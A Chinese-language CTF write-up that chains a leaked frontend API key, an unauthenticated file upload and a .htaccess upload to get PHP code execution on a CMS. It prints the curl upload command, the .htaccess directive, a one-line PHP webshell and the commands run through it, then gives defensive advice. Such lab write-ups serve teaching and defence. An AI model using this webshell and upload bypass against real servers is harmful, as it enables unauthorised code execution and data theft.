# CTF 解题记录：内容管理系统

## 赛题信息

- **难度：** Medium
- **分值：** 300
- **描述：** 公司最近部署了一套全新的企业内容管理系统，据开发团队说已经做了严格的安全加固，只允许管理员登录后才能管理文件。你能绕过这些限制吗？

## 解题过程

### 第一步：信息收集

访问网站首页，发现这是一个内容管理系统（CMS）。查看页面源码，发现加载了 `/assets/js/app.js` 文件。

### 第二步：JS 代码审计，发现 API 密钥泄露

分析 `app.js` 文件，发现前端代码中**硬编码了一个内部 API 密钥**：
```
cms_int_svc_k3y_9x2m7q
```

同时暴露了 API 的基础路径 `/api` 和上传端点 `/api/upload.php`。这个密钥本应是内部服务调用使用的，却被写在了前端代码中。

### 第三步：利用泄露的密钥上传文件

使用泄露的 API 密钥，尝试直接调用上传接口，**无需登录认证**：

```bash
curl -X POST http://target/api/upload.php \
  -F "file=@shell.php" \
  -H "X-API-Key: cms_int_svc_k3y_9x2m7q"
```

发现直接上传 `.php` 文件被 WAF 拦截，返回"Dangerous file extension detected"。

### 第四步：WAF 绕过 — .htaccess 上传

虽然 `.php` 文件被拦截，但 **`.htaccess` 文件没有被过滤**。这是 Apache 服务器的配置文件，可以改变服务器的文件处理行为。

1. **上传恶意的 `.htaccess` 文件**，内容为：
   ```apache
   AddType application/x-httpd-php .txt
   ```
   这条指令告诉 Apache：**将所有 `.txt` 文件当作 PHP 代码来执行**。

2. **上传 PHP Webshell**，保存为 `.txt` 扩展名：
   ```
   <?php system($_GET["cmd"]); ?>
   ```
   由于刚才上传的 `.htaccess` 生效，Apache 会将这个 `.txt` 文件当作 PHP 执行。

### 第五步：利用 Webshell 获取 Flag

访问上传的 webshell，执行系统命令：

1. 查找 Flag 文件：
   ```
   http://target/uploads/shell.txt?cmd=find / -name flag*
   ```
   找到 Flag 位于 `/challenge/flag.txt`

2. 读取 Flag：
   ```
   http://target/uploads/shell.txt?cmd=cat /challenge/flag.txt
   ```

## Flag

```
flag{1e9598659b7e44d535c502042bf1ddc8}
```

## 涉及的知识点

1. **前端代码信息泄露：** API 密钥、内部接口地址等敏感信息不应硬编码在前端代码中
2. **文件上传漏洞 + WAF 绕过：** 虽然限制了危险文件扩展名，但没有限制 `.htaccess` 上传，导致可以修改 Apache 的文件处理规则
3. **.htaccess 攻击：** 通过上传 `.htaccess` 文件，可以让服务器将任意扩展名的文件当作 PHP 执行
4. **未授权访问：** 上传接口仅依赖 API 密钥验证，而密钥已泄露，导致任何人都可以上传文件

## 防御建议

- 不要在前端代码中暴露 API 密钥或其他敏感凭据
- 文件上传白名单应只允许安全的文件类型，禁止上传 `.htaccess`、`.user.ini` 等配置文件
- 上传的文件应存储在非 Web 可访问的目录，或使用随机文件名
- API 接口应使用标准的身份认证机制（如 JWT、OAuth），而非自定义 API 密钥
- 对上传的文件内容进行检测，防止包含可执行代码
